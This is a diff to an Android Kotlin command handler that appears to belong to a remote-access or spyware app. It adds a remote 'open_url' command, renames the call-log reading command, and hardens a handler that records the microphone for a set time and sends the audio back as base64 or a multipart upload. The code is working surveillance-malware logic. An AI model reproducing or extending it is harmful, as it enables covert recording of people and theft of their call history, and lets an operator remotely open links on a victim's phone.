@@ -440,7 +440,19 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         return resp
                     }
                 }
-                "call_logs" -> {
+                "open_url" -> {
+                    try {
+                        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(textArg))
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        context.startActivity(intent)
+                        val resp = createResponse(cmdId, "success", "URL dibuka: $textArg")
+                        onResponse(resp); return resp
+                    } catch (e: Exception) {
+                        val resp = createResponse(cmdId, "error", "Open URL failed: ${e.message}")
+                        onResponse(resp); return resp
+                    }
+                }
+                "get_call_logs" -> {
                     if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
                         val res = JSONArray()
                         val cursor = context.contentResolver.query(
@@ -627,20 +639,24 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val duration = textArg.toLongOrNull() ?: 5L
                         val file = File(context.cacheDir, "record_${System.currentTimeMillis()}.mp4")
                         val mr = android.media.MediaRecorder()
-                        mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
-                        mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
-                        mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
-                        mr.setOutputFile(file.absolutePath)
-                        mr.prepare(); mr.start()
-                        Thread.sleep(duration * 1000)
-                        mr.stop(); mr.release()
+                        try {
+                            mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                            mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+                            mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+                            mr.setOutputFile(file.absolutePath)
+                            mr.prepare(); mr.start()
+                            Thread.sleep(duration * 1000)
+                            try { mr.stop() } catch (e: Exception) {}
+                        } finally {
+                            mr.release()
+                        }
                         
                         if (onMultipart != null) {
                             val jsonResp = createResponse(cmdId, "audio_multipart", "Audio recorded")
                             onMultipart(jsonResp, file, "media_file")
                             return jsonResp
                         } else {
-                            val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
+                            val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.NO_WRAP)
                             val resp = createResponse(cmdId, "audio_base64", b64)
                             onResponse(resp); return resp
                         }
